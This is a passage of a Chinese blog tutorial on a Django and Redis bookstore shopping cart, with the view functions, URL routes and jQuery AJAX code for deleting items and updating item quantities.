fl"</span>&gt;</span>+<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">books_id</span>=<span class="string">"&#123;&#123; book.id &#125;&#125;"</span> <span class="attr">class</span>=<span class="string">"num_show fl"</span> <span class="attr">value</span>=<span class="string">"&#123;&#123; book.count &#125;&#125;"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">class</span>=<span class="string">"minus fl"</span>&gt;</span>-<span class="tag">&lt;/<span class="name">a</span>&gt;</span>   </span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col07"</span>&gt;</span>&#123;&#123; book.amount &#125;&#125;元<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col08"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></p><h2 id="4，购物车中删除商品的功能"><a href="#4，购物车中删除商品的功能" class="headerlink" title="4，购物车中删除商品的功能"></a>4，购物车中删除商品的功能</h2><p>先来编写views.py函数。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cart/views.py</span></span><br><span class="line"><span class="comment"># 前端传过来的参数:商品id books_id</span></span><br><span class="line"><span class="comment"># post</span></span><br><span class="line"><span class="comment"># /cart/del/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cart_del</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''删除用户购物车中商品的信息'''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收数据</span></span><br><span class="line">    books_id = request.POST.get(<span class="string">'books_id'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 校验商品是否存放</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> all([books_id]):</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">1</span>, <span class="string">'errmsg'</span>: <span class="string">'数据不完整'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    books = Books.objects.get_books_by_id(books_id=books_id)</span><br><span class="line">    <span class="keyword">if</span> books <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">2</span>, <span class="string">'errmsg'</span>: <span class="string">'商品不存在'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除购物车商品信息</span></span><br><span class="line">    conn = get_redis_connection(<span class="string">'default'</span>)</span><br><span class="line">    cart_key = <span class="string">'cart_%d'</span> % request.session.get(<span class="string">'passport_id'</span>)</span><br><span class="line">    conn.hdel(cart_key, books_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回信息</span></span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">3</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>配置urls.py<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^del/$'</span>, views.cart_del, name=<span class="string">'delete'</span>), <span class="comment"># 购物车商品记录删除</span></span><br></pre></td></tr></table></figure></p><p>然后在购物车页面cart.html编写jquery代码来调用del接口。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block topfiles %&#125;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        update_cart_count()</span><br><span class="line">        <span class="comment">// 计算所有被选中商品的总价，总数目和商品的小计</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">update_total_price</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            total_count = <span class="number">0</span></span><br><span class="line">            total_price = <span class="number">0</span></span><br><span class="line">            <span class="comment">// 获取所有被选中的商品所在的ul元素</span></span><br><span class="line">            $(<span class="string">'.cart_list_td'</span>).find(<span class="string">':checked'</span>).parents(<span class="string">'ul'</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="comment">// 计算商品的小计</span></span><br><span class="line">                res_dict = update_books_price($(<span class="keyword">this</span>))</span><br><span class="line"></span><br><span class="line">                total_count += res_dict.books_count</span><br><span class="line">                total_price += res_dict.books_amount</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置商品的总价和总数目</span></span><br><span class="line">            $(<span class="string">'.settlements'</span>).find(<span class="string">'em'</span>).text(total_price.toFixed(<span class="number">2</span>))</span><br><span class="line">            $(<span class="string">'.settlements'</span>).find(<span class="string">'b'</span>).text(total_count)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算商品的小计</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">update_books_price</span>(<span class="params">books_ul</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 获取每一个商品的价格和数量</span></span><br><span class="line">                books_price = books_ul.children(<span class="string">'.col05'</span>).text()</span><br><span class="line">                books_count = books_ul.find(<span class="string">'.num_show'</span>).val()</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 计算商品的小计</span></span><br><span class="line">                books_price = <span class="built_in">parseFloat</span>(books_price)</span><br><span class="line">                books_count = <span class="built_in">parseInt</span>(books_count)</span><br><span class="line">                books_amount = books_price * books_count</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 设置商品的小计</span></span><br><span class="line">                books_ul.children(<span class="string">'.col07'</span>).text(books_amount.toFixed(<span class="number">2</span>) + <span class="string">'元'</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="string">'books_count'</span>: books_count,</span><br><span class="line">                    <span class="string">'books_amount'</span>: books_amount</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新页面上购物车商品的总数</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">update_cart_count</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            #  更新列表上方商品总数</span><br><span class="line">            $.get(<span class="string">'/cart/count/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">                $(<span class="string">'.total_count'</span>).children(<span class="string">'em'</span>).text(data.res)</span><br><span class="line">            #  更新页面右上方购物车商品总数</span><br><span class="line">            $.get(<span class="string">'/cart/count/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">                $(<span class="string">'#show_count'</span>).html(data.res)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 购物车商品信息的删除</span></span><br><span class="line">        $(<span class="string">'.cart_list_td'</span>).children(<span class="string">'.col08'</span>).children(<span class="string">'a'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 获取删除的商品的id</span></span><br><span class="line">            books_ul = $(<span class="keyword">this</span>).parents(<span class="string">'ul'</span>)</span><br><span class="line">            books_id = books_ul.find(<span class="string">'.num_show'</span>).attr(<span class="string">'books_id'</span>)</span><br><span class="line">            csrf = $(<span class="string">'input[name="csrfmiddlewaretoken"]'</span>).val()</span><br><span class="line">            params = &#123;</span><br><span class="line">                <span class="string">"books_id"</span>: books_id,</span><br><span class="line">                <span class="string">"csrfmiddlewaretoken"</span>: csrf</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 发起ajax请求，访问/cart/del/</span></span><br><span class="line">            $.post(<span class="string">'/cart/del/'</span>, params, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (data.res == <span class="number">3</span>)&#123;</span><br><span class="line">                    <span class="comment">// 删除成功</span></span><br><span class="line">                    <span class="comment">// 移除商品对应的ul元素</span></span><br><span class="line">                    books_ul.remove() <span class="comment">// books.empty()</span></span><br><span class="line">                    <span class="comment">// 判断商品对应的checkbox是否选中</span></span><br><span class="line">                    is_checked = books_ul.find(<span class="string">':checkbox'</span>).prop(<span class="string">'checked'</span>)</span><br><span class="line">                    <span class="keyword">if</span> (is_checked)&#123;</span><br><span class="line">                        update_total_price()</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 更新页面购物车商品总数</span></span><br><span class="line">                    update_cart_count()</span><br><span class="line">                    <span class="comment">// 更新选择框状态</span></span><br><span class="line">                    $(<span class="string">'.settlements'</span>).find(<span class="string">":checkbox"</span>).prop(<span class="string">'checked'</span>, <span class="literal">false</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&#123;% endblock topfiles %&#125;</span></span><br></pre></td></tr></table></figure></p><p>为避免403，我们添加一行{ % csrf_token %}</p><h2 id="5，实现购物车页面编辑商品数量的功能。"><a href="#5，实现购物车页面编辑商品数量的功能。" class="headerlink" title="5，实现购物车页面编辑商品数量的功能。"></a>5，实现购物车页面编辑商品数量的功能。</h2><p>我们先来编写更新购物车的接口。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cart/views.py</span></span><br><span class="line"><span class="comment"># 前端传过来的参数:商品id books_id 更新数目 books_count</span></span><br><span class="line"><span class="comment"># post</span></span><br><span class="line"><span class="comment"># /cart/update/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cart_update</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''更新购物车商品数目'''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收数据</span></span><br><span class="line">    books_id = request.POST.get(<span class="string">'books_id'</span>)</span><br><span class="line">    books_count = request.POST.get(<span class="string">'books_count'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数据的校验</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> all([books_id, books_count]):</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">1</span>, <span class="string">'errmsg'</span>: <span class="string">'数据不完整'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    books = Books.objects.get_books_by_id(books_id=books_id)</span><br><span class="line">    <span class="keyword">if</span> books <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">2</span>, <span class="string">'errmsg'</span>: <span class="string">'商品不存在'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        books_count = int(books_count)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">3</span>, <span class="string">'errmsg'</span>: <span class="string">'商品数目必须为数字'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 更新操作</span></span><br><span class="line">    conn = get_redis_connection(<span class="string">'default'</span>)</span><br><span class="line">    cart_key = <span class="string">'cart_%d'</span> % request.session.get(<span class="string">'passport_id'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断商品库存</span></span><br><span class="line">    <span class="keyword">if</span> books_count &gt; books.stock:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">4</span>, <span class="string">'errmsg'</span>: <span class="string">'商品库存不足'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    conn.hset(cart_key, books_id, books_count)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">5</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>注意别忘了配置cart app的urls.py。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^update/$'</span>, views.cart_update, name=<span class="string">"update"</span>)</span><br></pre></td></tr></table></figure></p><p>然后编写jquery代码来实现前端更新数量以及全选这样的功能。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 全选和全不选</span></span><br><span class="line">$(<span class="string">'.settlements'</span>).find(<span class="string">':checkbox'</span>).change(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 获取全选checkbox的选中状态</span></span><br><span class="line">    is_checked = $(<span class="keyword">this</span>).prop(<span class="string">'checked'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历所有商品对应的checkbox,设置checked属性和全选checkbox一致</span></span><br><span class="line">    $(<span class="string">'.cart_list_td'</span>).find(<span class="string">':checkbox'</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="keyword">this</span>).prop(<span class="string">'checked'</span>, is_checked)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新商品的信息</span></span><br><span class="line">    update_total_price()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 商品对应的checkbox状态发生改变时，全选checkbox的改变</span></span><br><span class="line">$(<span class="string">'.cart_list_td'</span>).find(<span class="string">':checkbox'</span>).change(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 获取所有商品对应的checkbox的数目</span></span><br><span class="line">    all_len = $(<span class="string">'.cart_list_td'</span>).find(<span class="string">':checkbox'</span>).length</span><br><span class="line">    <span class="comment">// 获取所有被选中商品的checkbox的数目</span></span><br><span class="line">    checked_len  = $(<span class="string">'.cart_list_td'</span>).find(<span class="string">':checked'</span>).length</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (checked_len &lt; all_len)&#123;</span><br><span class="line">        $(<span class="string">'.settlements'</span>).find(<span class="string">':checkbox'</span>).prop(<span class="string">'checked'</span>, <span class="literal">false</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">         $(<span class="string">'.settlements'</span>).find(<span class="string">':checkbox'</span>).prop(<span class="string">'checked'</span>, <span class="literal">true</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新商品的信息</span></span><br><span class="line">    update_total_price()</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 购物车商品数目的增加</span></span><br><span class="line">$(<span class="string">'.add'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 获取商品的数目和商品的id</span></span><br><span class="line">    books_count = $(<span class="keyword">this</span>).next().val()</span><br><span class="line">    books_id = $(<span class="keyword">this</span>).next().attr(<span class="string">'books_id'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新购物车信息</span></span><br><span class="line">    books_count = <span class="built_in">parseInt</span>(books_count) + <span class="number">1</span></span><br><span class="line">    update_remote_cart_info(books_id, books_count)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据更新的结果进行操作</span></span><br><span class="line">    <span class="keyword">if</span> (error_update == <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="comment">// 更新成功</span></span><br><span class="line">        $(<span class="keyword">this</span>).next().val(books_count)</span><br><span class="line">        <span class="comment">// 获取商品对应的checkbox的选中状态</span></span><br><span class="line">        is_checked = $(<span class="keyword">this</span>).parents(<span class="string">'ul'</span>).find(<span class="string">':checkbox'</span>).prop(<span class="string">'checked'</span>)</span><br><span class="line">        <span class="keyword">if</span> (is_checked)&#123;</span><br><span class="line">            <span class="comment">// 更新商品的总数目，总价格和小计</span></span><br><span class="line">            update_total_price()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 更新商品的小计</span></span><br><span class="line">            update_books_price($(<span class="keyword">this</span>).parents(<span class="string">'ul'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 更新页面购物车商品总数</span></span><br><span class="line">        update_cart_count()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 购物车商品数目的减少</span></span><br><span class="line">$(<span class="string">'.minus'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 获取商品的数目和商品的id</span></span><br><span class="line">    books_count = $(<span class="keyword">this</span>).prev().val()</span><br><span class="line">    books_id = $(<span class="keyword">this</span>).prev().attr(<span class="string">'books_id'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新购物车信息</span></span><br><span class="line">    books_count = <span class="built_in">parseInt</span>(books_count) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (books_count &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        books_count = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    update_remote_cart_info(books_id, books_count)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据更新的结果进行操作</span></span><br><span class="line">    <span class="keyword">if</span> (error_update == <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="comment">// 更新成功</span></span><br><span class="line">        $(<span class="keyword">this</span>).prev().val(books_count)</span><br><span class="line">        <span class="comment">// 获取商品对应的checkbox的选中状态</span></span><br><span class="line">        is_checked = $(<span class="keyword">this</span>).parents(<span class="string">'ul'</span>).find(<span class="string">':checkbox'</span>).prop(<span class="string">'checked'</span>)</span><br><span class="line">        <span class="keyword">if</span> (is_checked)&#123;</span><br><span class="line">            <span class="comment">// 更新商品的总数目，总价格和小计</span></span><br><span class="line">            update_total_price()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 更新商品的小计</span></span><br><span class="line">            update_books_price($(<span class="keyword">this</span>).parents(<span class="string">'ul'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 更新页面购物车商品总数</span></span><br><span class="line">        update_cart_count()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">pre_books_count = <span class="number">0</span></span><br><span class="line">$(<span class="string">'.num_show'</span>).focus(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    pre_books_count = $(<span class="keyword">this</span>).val()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 购物车商品数目的手动输入</span></span><br><span class="line">$(<span class="string">'.num_show'</span>).blur(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 获取商品的数目和商品的id</span></span><br><span class="line">    books_count = $(<span class="keyword">this</span>).val()</span><br><span class="line">    books_id = $(<span class="keyword">this</span>).attr(<span class="string">'books_id'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 校验用户输入的商品数目</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isNaN</span>(books_count) || books_count.trim().length == <span class="number">0</span> || <span class="built_in">parseInt</span>(books_count)&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// 设置回输入之前的值</span></span><br><span class="line">        $(<span class="keyword">this</span>).val(pre_books_count)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新购物车信息</span></span><br><span class="line">    books_count = <span class="built_in">parseInt</span>(books_count)</span><br><span class="line"></span><br><span class="line">    update_remote_cart_info(books_id, books_count)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据更新的结果进行操作</span></span><br><span class="line">    <span class="keyword">if</span> (error_update == <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="comment">// 更新成功</span></span><br><span class="line">        $(<span class="keyword">this</span>).val(books_count)</span><br><span class="line">        <span class="comment">// 获取商品对应的checkbox的选中状态</span></span><br><span class="line">        is_checked = $(<span class="keyword">this</span>).parents(<span class="string">'ul'</span>).find(<span class="string">':checkbox'</span>).prop(<span class="string">'checked'</span>)</span><br><span class="line">        <span class="keyword">if</span> (is_checked)&#123;</span><br><span class="line">            <span class="comment">// 更新商品的总数目，总价格和小计</span></span><br><span class="line">            update_total_price()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 更新商品的小计</span></span><br><span class="line">            update_books_price($(<span class="keyword">this</span>).parents(<span class="string">'ul'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 更新页面购物车商品总数</span></span><br><span class="line">        update_cart_count()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 设置回输入之前的值</span></span><br><span class="line">        $(<span class="keyword">this</span>).val(pre_books_count)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里要注意看看jquery是怎么发送ajax post请求的。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 更新redis中购物车商品数目</span></span><br><span class="line">error_update = <span class="literal">false</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update_remote_cart_info</span>(<span class="params">books_id, books_count</span>) </span>&#123;</span><br><span class="line">    csrf = $(<span class="string">'input[name="csrfmiddlewaretoken"]'</span>).val()</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'books_id'</span>: books_id,</span><br><span class="line">        <span class="string">'books_count'</span>: books_count,</span><br><span class="line">        <span class="string">'csrfmiddlewaretoken'</span>: csrf</span><br><span 